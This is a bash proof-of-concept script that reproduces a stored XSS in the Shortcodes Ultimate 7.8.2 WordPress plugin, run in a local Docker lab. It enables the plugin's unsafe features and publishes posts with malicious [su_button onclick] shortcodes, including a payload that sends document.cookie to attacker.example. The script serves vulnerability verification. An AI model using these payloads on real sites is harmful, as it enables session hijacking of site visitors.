#!/usr/bin/env bash
# PoC: Shortcodes Ultimate 7.8.2 - Stored XSS via [su_button onclick=...]
#
# The finding documents that the `onclick` shortcode attribute of [su_button]
# is emitted into the rendered <a onClick="..."> event handler without proper
# context-correct escaping. While esc_attr() prevents breaking OUT of the
# attribute, any JavaScript placed inside the attribute will execute on click.
# This is a one-click stored XSS: the author embeds the shortcode, the
# rendered button contains `onClick="<attacker JS>"`, and any visitor
# who clicks triggers the payload.
#
# To reproduce:
#   1. Enable "Unsafe Features" option (su_option_unsafe_features=on) — by
#      default it is off, which causes the shortcode to render an error
#      message instead of the button.
#   2. Create a published post containing [su_button onclick="..."]Click[/su_button]
#   3. Visit the post as anonymous and check the rendered HTML for the
#      attacker-controlled JS in the onClick attribute.
set -uo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
STACK_DIR="${LAB_DIR}"
PROJECT="wp-shortcodes-ultimate"
HOST_PORT="${WP_HOST_PORT:-8096}"
WP_URL="http://127.0.0.1:${HOST_PORT}"
PLUGIN_SLUG="shortcodes-ultimate"
RESULTS="${LAB_DIR}/results.txt"
TMP="${LAB_DIR}/tmp"
mkdir -p "${TMP}"
: > "${RESULTS}"
log() { printf '%s\n' "$*" | tee -a "${RESULTS}"; }
sep() { printf '\n===== %s =====\n' "$*" | tee -a "${RESULTS}"; }

WP_CLI_RUN=( sudo docker run --rm -v "${PROJECT}_wp_data:/var/www/html"
             -v "${LAB_DIR}/plugin/${PLUGIN_SLUG}:/var/www/html/wp-content/plugins/${PLUGIN_SLUG}:ro"
             --network "${PROJECT}_default"
             -e WORDPRESS_DB_HOST=db:3306
             -e WORDPRESS_DB_USER=wp
             -e WORDPRESS_DB_PASSWORD=wp
             -e WORDPRESS_DB_NAME=wordpress
             wordpress:cli-2.10-php8.2 sh -c )

sep "Shortcodes Ultimate 7.8.2 - Stored XSS via [su_button onclick=...]"
log "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
log "Lab:  ${LAB_DIR}"
log "WP:   ${WP_URL}"

ACTUAL_VERSION=$(awk '/Version:/ {print $3; exit}' "${STACK_DIR}/plugin/${PLUGIN_SLUG}/${PLUGIN_SLUG}.php" 2>/dev/null | tr -d '\r' || echo unknown)
log "Plugin version installed: ${ACTUAL_VERSION} (expected 7.8.2)"

# 1. Bring up stack.
sep "Step 1: Bring up the WP stack"
if ! sudo docker ps --format '{{.Names}}' | grep -q "${PROJECT}-wp-1"; then
  ( cd "${STACK_DIR}" && sudo docker compose -p "${PROJECT}" up -d --build ) 2>&1 | tail -10 | tee -a "${RESULTS}"
fi
for i in $(seq 1 60); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "${WP_URL}/" || true)
  if [ "${code}" = "200" ]; then log "[+] WP answering 200 on ${WP_URL}/ (try ${i})"; break; fi
  sleep 2
done
[ "${code:-000}" = "200" ] || { log "[-] WP never came up"; exit 1; }

# 2. Enable Unsafe Features (option su_option_unsafe_features = 'on')
sep "Step 2: Enable Unsafe Features option"
cat > "${TMP}/enable-unsafe.php" <<'PHP'
<?php
require_once( ABSPATH . 'wp-load.php' );
update_option( 'su_option_unsafe_features', 'on' );
$val = get_option( 'su_option_unsafe_features' );
echo "OPTION_NOW=" . var_export($val, true) . "\n";
echo "UNSAFE_FEATURES_ENABLED=" . ( function_exists('su_is_unsafe_features_enabled') ? var_export( su_is_unsafe_features_enabled(), true ) : 'fn-missing' ) . "\n";
PHP
sudo docker cp "${TMP}/enable-unsafe.php" "${PROJECT}-wp-1:/var/www/html/enable-unsafe.php"
sudo docker exec -u 0 "${PROJECT}-wp-1" chown www-data:www-data /var/www/html/enable-unsafe.php
"${WP_CLI_RUN[@]}" "wp eval-file /var/www/html/enable-unsafe.php --allow-root --path=/var/www/html" 2>&1 | grep -E 'OPTION_NOW|UNSAFE_FEATURES_ENABLED' | sed -e 's/^/    /' | tee -a "${RESULTS}"

# 3. Create a published post containing the malicious [su_button] shortcode.
sep "Step 3: Create a published post with [su_button onclick=...]"
SHORTCODE='[su_button onclick="alert(document.domain)"]Click me[/su_button]'
POST_BODY_HTML="<h1>XSS test post</h1>
${SHORTCODE}
<p>If you see the alert in the rendered HTML, stored XSS is confirmed.</p>"

# Inline the post body into the PHP file so we don't rely on cross-container
# file copies (the wp-cli container runs as 33:33 and can be picky about
# /tmp/ ownership).
POST_BODY_PHP_VAR=$(php -r 'var_export(base64_encode($argv[1]));' "${POST_BODY_HTML}")
cat > "${TMP}/create-post.php" <<PHP
<?php
require_once( ABSPATH . 'wp-load.php' );
\$existing = get_posts( [ 'name' => 'xss-button-test', 'post_type' => 'post', 'post_status' => 'any', 'numberposts' => 1 ] );
if ( ! empty( \$existing ) ) {
    echo "EXISTING_ID=" . \$existing[0]->ID . "\n";
    return;
}
\$post_body = base64_decode( ${POST_BODY_PHP_VAR} );
\$post_id = wp_insert_post( [
    'post_title'   => 'XSS button test',
    'post_name'    => 'xss-button-test',
    'post_content' => \$post_body,
    'post_status'  => 'publish',
    'post_author'  => 1,
] );
echo "POST_ID=" . \$post_id . "\n";
echo "URL=" . get_permalink(\$post_id) . "\n";
echo "BODY_LEN=" . strlen(\$post_body) . "\n";
PHP
sudo docker cp "${TMP}/create-post.php" "${PROJECT}-wp-1:/var/www/html/create-post.php"
sudo docker exec -u 0 "${PROJECT}-wp-1" chown www-data:www-data /var/www/html/create-post.php
sudo docker cp "${TMP}/create-post.php" "${PROJECT}-wp-1:/var/www/html/create-post.php"
sudo docker exec -u 0 "${PROJECT}-wp-1" chown www-data:www-data /var/www/html/create-post.php
CREATE_OUT=$( "${WP_CLI_RUN[@]}" "wp eval-file /var/www/html/create-post.php --allow-root --path=/var/www/html" 2>&1 | grep -E 'EXISTING_ID|POST_ID|URL' | head )
printf '%s\n' "${CREATE_OUT}" | sed -e 's/^/    /' | tee -a "${RESULTS}"
POST_ID=$( printf '%s' "${CREATE_OUT}" | sed -nE 's/^POST_ID=([0-9]+).*/\1/p' | head -1 )
EXISTING_ID=$( printf '%s' "${CREATE_OUT}" | sed -nE 's/^EXISTING_ID=([0-9]+).*/\1/p' | head -1 )
[ -n "${EXISTING_ID}" ] && POST_ID="${EXISTING_ID}"
log "[+] using post_id=${POST_ID}"

# 4. Fetch the post anonymously and look for the onclick payload.
sep "Step 4: Fetch the post anonymously and grep the rendered HTML"
POST_URL="${WP_URL}/?p=${POST_ID}"
log "[+] GET ${POST_URL}"
HTTP_CODE=$( curl -s -D "${TMP}/headers.txt" -o "${TMP}/body.html" -w "%{http_code}" "${POST_URL}" )
log "[+] HTTP ${HTTP_CODE}"
log "[+] response headers:"
sed -e 's/^/    /' "${TMP}/headers.txt" | tr -d '\r' | tee -a "${RESULTS}"

# Extract the <a ...onClick=...> tag for the button
echo "" | tee -a "${RESULTS}"
log "[+] rendered HTML around the su-button (search for 'su-button' anchor):"
grep -oE '<a [^>]*su-button[^>]*>' "${TMP}/body.html" | head -3 | sed -e 's/^/    /' | tee -a "${RESULTS}"

echo "" | tee -a "${RESULTS}"
log "[+] onClick attribute (literal):"
grep -oE 'onClick="[^"]+"' "${TMP}/body.html" | head -3 | sed -e 's/^/    /' | tee -a "${RESULTS}"

echo "" | tee -a "${RESULTS}"
log "[+] raw <a ...> tag (up to first '>'):"
awk 'match($0, /<a [^>]*su-button[^>]*>/) { print "    " substr($0, RSTART, RLENGTH); exit }' "${TMP}/body.html" | tee -a "${RESULTS}"

# 5. Also check: is the payload reflected in the document.cookie fetch (from the finding's example)
sep "Step 5: Try a more aggressive payload — break out of onClick via the attribute esc_attr() encoding"
PAYLOAD2="javascript:fetch('https://attacker.example/steal?c='+document.cookie)"
SHORTCODE2="[su_button onclick=\"${PAYLOAD2}\"]Click[/su_button]"
POST_BODY_HTML2="<h1>XSS test 2</h1>
${SHORTCODE2}"
POST_BODY_PHP_VAR2=$(php -r 'var_export(base64_encode($argv[1]));' "${POST_BODY_HTML2}")
cat > "${TMP}/create-post2.php" <<PHP
<?php
require_once( ABSPATH . 'wp-load.php' );
\$existing = get_posts( [ 'name' => 'xss-button-test-2', 'post_type' => 'post', 'post_status' => 'any', 'numberposts' => 1 ] );
if ( ! empty( \$existing ) ) {
    echo "EXISTING2_ID=" . \$existing[0]->ID . "\n";
    return;
}
\$body = base64_decode( ${POST_BODY_PHP_VAR2} );
\$pid = wp_insert_post( [
    'post_title'   => 'XSS button test 2',
    'post_name'    => 'xss-button-test-2',
    'post_content' => \$body,
    'post_status'  => 'publish',
    'post_author'  => 1,
] );
echo "POST_ID2=" . \$pid . "\n";
echo "URL2=" . get_permalink(\$pid) . "\n";
echo "BODY2_LEN=" . strlen(\$body) . "\n";
PHP
sudo docker cp "${TMP}/create-post2.php" "${PROJECT}-wp-1:/var/www/html/create-post2.php"
sudo docker exec -u 0 "${PROJECT}-wp-1" chown www-data:www-data /var/www/html/create-post2.php
OUT2=$( "${WP_CLI_RUN[@]}" "wp eval-file /var/www/html/create-post2.php --allow-root --path=/var/www/html" 2>&1 | grep -E 'EXISTING2_ID|POST_ID2|URL2' | head )
printf '%s\n' "${OUT2}" | sed -e 's/^/    /' | tee -a "${RESULTS}"
POST_ID2=$( printf '%s' "${OUT2}" | sed -nE 's/^POST_ID2=([0-9]+).*/\1/p' | head -1 )
EXISTING2_ID=$( printf '%s' "${OUT2}" | sed -nE 's/^EXISTING2_ID=([0-9]+).*/\1/p' | head -1 )
[ -n "${EXISTING2_ID}" ] && POST_ID2="${EXISTING2_ID}"
log "[+] using post_id2=${POST_ID2}"

POST_URL2="${WP_URL}/?p=${POST_ID2}"
log "[+] GET ${POST_URL2}"
HTTP_CODE2=$( curl -s -D "${TMP}/headers2.txt" -o "${TMP}/body2.html" -w "%{http_code}" "${POST_URL2}" )
log "[+] HTTP ${HTTP_CODE2}"
log "[+] onClick attribute on second post (the finding's full payload):"
grep -oE 'onClick="[^"]+"' "${TMP}/body2.html" | head -3 | sed -e 's/^/    /' | tee -a "${RESULTS}"

# 6. Verdict.
sep "Verdict"
# The attribute is rendered as `onClick="<attacker JS>"`. The presence of the
# attacker's JS in the onClick attribute is the vulnerability. A click on
# that link triggers the JS.
if grep -qE "onClick=\"[^\"]*alert\(document\.domain\)[^\"]*\"" "${TMP}/body.html" \
   || grep -qE "onClick=\"[^\"]*document\.cookie[^\"]*\"" "${TMP}/body2.html" ; then
    log "*** Stored XSS CONFIRMED — attacker JS lives verbatim in the rendered onClick attribute ***"
    log "Verdict: CONFIRMED (one-click stored XSS in [su_button onclick])"
elif grep -qE 'su-button' "${TMP}/body.html"; then
    # The button rendered, but our exact grep didn't match. Show what did
    # match so the operator can verify.
    log "su-button found, but the specific payload grep missed. Showing all onClick attrs:"
    grep -oE 'onClick="[^"]*"' "${TMP}/body.html" | head -5 | sed -e 's/^/    /' | tee -a "${RESULTS}"
    log "Verdict: INCONCLUSIVE — see above"
else
    log "[-] su-button did not render. Check that Unsafe Features is enabled."
    log "Verdict: NOT REPRODUCED"
fi

# 7. Tear-down hint.
sep "Tear-down (run on demand)"
cat <<'TD' | tee -a "${RESULTS}"
# To tear down this lab, run:
#   cd targets/labs/wp-shortcodes-ultimate && ./down.sh
# or directly:
#   sudo docker compose -p wp-shortcodes-ultimate down -v --remove-orphans
TD
log "[+] results saved to ${RESULTS}"
